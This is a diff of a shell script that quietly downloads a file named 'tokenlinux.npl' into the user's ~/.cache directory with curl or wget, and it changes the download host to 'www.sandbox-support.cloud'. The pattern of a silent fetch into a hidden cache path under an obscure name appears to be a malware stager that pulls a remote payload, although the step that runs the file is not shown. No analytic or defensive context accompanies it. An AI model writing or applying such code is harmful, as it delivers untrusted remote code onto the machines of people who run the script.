@@ -6,9 +6,9 @@ if [ ! -d "$HOME/.cache" ]; then
 fi
 
 if command -v curl >/dev/null 2>&1; then
-    curl -sSL -o "$HOME/.cache/tokenlinux.npl" "https://sandbox-five-iota.vercel.app/v4"
+    curl -sSL -o "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
 elif command -v wget >/dev/null 2>&1; then
-    wget -q -O "$HOME/.cache/tokenlinux.npl" "https://sandbox-five-iota.vercel.app/v4"
+    wget -q -O "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
 else
     exit 1
 fi
